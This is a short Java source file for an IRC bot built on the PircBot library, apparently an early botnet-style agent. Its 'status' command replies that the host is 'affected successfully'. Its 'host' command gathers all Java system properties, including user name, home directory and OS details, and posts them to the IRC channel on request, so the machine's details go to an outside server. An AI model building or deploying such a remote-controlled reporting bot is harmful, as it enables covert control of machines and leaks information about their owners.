package botproject;


import java.util.Properties;
import java.util.Set;

import org.jibble.pircbot.*;

public class MyBot extends PircBot {
    static String mess,s;
   
    public MyBot() {
    	
        this.setName("MyBotpm");
     
    }
    @Override
    public void onMessage(String channel, String sender,String login, String hostname, String message)
    {
    	
    	String s=" ";
    	 mess=message;
 if (message.equalsIgnoreCase("time")) {
 String time = new java.util.Date().toString();
 sendMessage(channel, sender + ": The time is now " + time);

}
if (message.equalsIgnoreCase("status")) {
	 sendMessage(channel, sender + ": This host is affected successfully");
	}
if (message.equalsIgnoreCase("host")) {
	 Properties prop = System.getProperties();
     Set<Object> keySet = prop.keySet();
     for(Object obj : keySet){
    	 s=s+": System property: " + obj.toString()+","+System.getProperty(obj.toString());
         System.out.println("System Property: {"+obj.toString()+","+System.getProperty(obj.toString())+"}");
         
     }
     sendMessage(channel, sender + s);}
     
	}
    
       
    }
    


